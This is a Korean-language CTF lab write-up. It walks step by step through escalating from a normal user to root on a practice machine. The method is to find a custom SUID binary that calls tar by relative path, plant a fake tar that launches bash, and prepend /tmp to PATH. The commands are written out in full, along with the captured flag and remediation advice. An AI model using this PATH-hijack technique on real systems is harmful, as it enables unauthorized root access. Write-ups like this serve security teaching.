+++
title = "VulnABLE CTF [LUXORA] Write-up: Vertical Privilege Escalation (Root Flag)"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Privilege Escalation", "SUID", "PATH Injection", "Root", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Vertical Privilege Escalation (Root Flag)

## 🎯 챌린지 개요
- **카테고리**: Privilege Escalation (수직적 권한 상승)
- **목표**: 일반 유저(`user1`) 권한에서 출발하여, 잘못 설정된 SUID 바이너리의 취약점(PATH 환경변수 인젝션)을 파고들어 시스템의 최고 관리자인 **Root(루트)** 권한을 탈취하고 최종 플래그를 획득하라.

---

## 🕵️‍♂️ 1. 권한 상승 벡터 탐색 (Enumeration)

시스템에 일반 유저로 들어왔다면, 가장 먼저 찾아봐야 할 것은 "루트(root) 권한으로 실행되도록 허락된 파일이 있는가?" 입니다. 리눅스에서는 이를 **SUID(Set Owner User ID)** 라고 부릅니다.

### SUID 파일 검색
시스템 전체에서 소유자가 `root` 이면서 SUID 비트(4000)가 설정된 파일을 검색합니다. `2>/dev/null` 은 권한 부족으로 발생하는 에러 메시지를 버려서 화면을 깔끔하게 보기 위함입니다.

```bash
user1@vulnable:~$ find / -perm -4000 -type f 2>/dev/null
```

**[검색 결과]**
```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
... (일반적인 리눅스 기본 명령어들) ...
/usr/local/bin/sys_backup   <-- 🚨 매우 수상한 파일 발견!
```

**[해커의 사고 과정]**
1. `passwd`나 `sudo` 같은 파일은 원래 SUID가 걸려있는 정상적인 파일이다.
2. 하지만 `/usr/local/bin/sys_backup`은 시스템 기본 명령어가 아니다. 관리자가 백업 작업을 편하게 하려고 직접 만든(Custom) 스크립트나 바이너리임이 분명하다.
3. 이 파일의 실행 권한을 확인해보자.

```bash
user1@vulnable:~$ ls -la /usr/local/bin/sys_backup
-rwsr-xr-x 1 root root 16432 Oct 10 15:30 /usr/local/bin/sys_backup
```
`rws` 에서 `s`가 보입니다. 소유자는 `root` 입니다. 즉, 내가 이 파일을 실행하면 **그 순간만큼은 내가 루트가 된다**는 뜻입니다!

---

## 💥 2. 취약점 식별 및 원리 분석 (Vulnerability Identification)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Low Priv User ] --(Run SUID Binary / PATH Injection)--> [ Root Shell ]
```


이 `sys_backup` 프로그램이 내부적으로 어떻게 동작하는지 알아야 공격할 수 있습니다. 

### 바이너리 실행 및 문자열 추출
먼저 파일을 그냥 실행해봅니다.

```bash
user1@vulnable:~$ /usr/local/bin/sys_backup
Backing up system logs...
tar: Removing leading `/' from member names
Backup completed successfully!
```
메시지를 보니 시스템 로그를 `tar` 명령어로 압축(백업)하는 프로그램인 것 같습니다. 
바이너리 내부에 하드코딩된 문자열을 추출하는 `strings` 명령어로 속을 들여다봅니다.

```bash
user1@vulnable:~$ strings /usr/local/bin/sys_backup
...
Backing up system logs...
tar -czf /var/backups/syslog.tar.gz /var/log/syslog
Backup completed successfully!
...
```

### 🚨 치명적 취약점 발견: 상대 경로 (Relative Path) 사용
관리자가 코드를 짤 때 `tar` 명령어를 `/bin/tar` 처럼 **절대 경로(Absolute Path)**로 명시하지 않고, 그냥 `tar` 라고 **상대 경로**로 작성했습니다.

이것이 왜 치명적일까요? 
리눅스는 사용자가 `tar` 라고만 치면, **환경변수 `$PATH`**에 등록된 폴더들을 맨 앞부터 순서대로 뒤져서 제일 먼저 나오는 `tar` 실행 파일을 실행합니다. 

그렇다면 내가 가짜 `tar`를 만들고 내 `$PATH`를 조작하면, 이 SUID 프로그램은 진짜 `tar` 대신 **내가 만든 가짜 악성 `tar`를 루트 권한으로 실행하게 될 것입니다!** (이것이 PATH Variable Injection 입니다.)

---

## 🚀 3. 공격 수행 및 루트 탈취 (Exploitation)

이해한 원리를 바탕으로 한 단계씩 공격을 세팅합니다.

### Step 1. 가짜 `tar` 프로그램 (페이로드) 만들기
내가 마음대로 파일을 만들고 지울 수 있는 임시 폴더 `/tmp` 로 이동합니다. 그리고 `/bin/bash` (터미널)을 실행시켜주는 가짜 `tar` 스크립트를 만듭니다.

```bash
user1@vulnable:~$ cd /tmp
user1@vulnable:/tmp$ echo "/bin/bash" > tar
```

### Step 2. 가짜 프로그램에 실행 권한 부여
```bash
user1@vulnable:/tmp$ chmod +x tar
```

### Step 3. PATH 환경변수 하이재킹 (Hijacking)
가장 중요한 단계입니다. 현재 터미널의 `$PATH` 맨 앞에 `/tmp` 폴더를 끼워 넣습니다.
```bash
user1@vulnable:/tmp$ export PATH=/tmp:$PATH
user1@vulnable:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
이제 시스템은 어떤 명령어를 치든 무조건 `/tmp` 부터 뒤집니다.

### Step 4. 트리거 (Exploit!)
취약한 SUID 바이너리를 실행합니다.
```bash
user1@vulnable:/tmp$ /usr/local/bin/sys_backup
```

프로그램이 실행되면서 "tar"를 호출합니다. 시스템은 `$PATH`를 따라 `/tmp/tar` 를 발견하고 이를 냅다 실행합니다. 그리고 그 `/tmp/tar` 안에는 `/bin/bash` 가 들어있습니다. 이 모든 과정이 **루트(root)** 권한으로 일어납니다.

**[결과 확인]**
```bash
root@vulnable:/tmp# whoami
root
root@vulnable:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1000(user1)
```

**시스템 완벽 장악 성공! (Pwned)**

---

## 🚩 4. 롸잇업 결론 및 플래그 획득

신(Root)의 권한을 얻었으니 가장 깊숙한 곳에 숨겨진 마지막 플래그를 읽을 수 있습니다.

```bash
root@vulnable:/tmp# cat /root/root.txt
THM{r00t_pr1v3sc_m4st3r_999}
```

**🔥 획득한 플래그:**
`THM{r00t_pr1v3sc_m4st3r_999}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
시스템 관리자의 편의를 위한 쉘 스크립팅 습관이 시스템 전체를 날려버리는 재앙으로 돌아온 사례입니다.

1. **절대 경로 사용 (Absolute Paths)**
   - 스크립트나 C 코드 내부에서 외부 명령어를 호출할 때는 **반드시** 전체 경로(`/bin/tar`, `/usr/bin/cat`)를 적어야 합니다.
   - ❌ `system("tar -czf ...");`
   - ✅ `system("/bin/tar -czf ...");`

2. **환경변수 초기화 강제 (Environment Sanitization)**
   - 루트 권한으로 실행되는 프로그램은 실행 직후 내부적으로 `$PATH`를 안전한 기본값으로 덮어써야 합니다.
   - 예: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

3. **최소 권한의 원칙 준수**
   - SUID는 양날의 검입니다. 정말로 꼭 필요한 시스템 기본 바이너리(`passwd`, `ping` 등)가 아니면 직접 만든 스크립트에 절대 SUID(`chmod +s`)를 부여해서는 안 됩니다. 대신 `sudoers` 설정을 통해 특정 유저가 특정 스크립트만 제한적으로 실행할 수 있도록 하는 것이 정석입니다.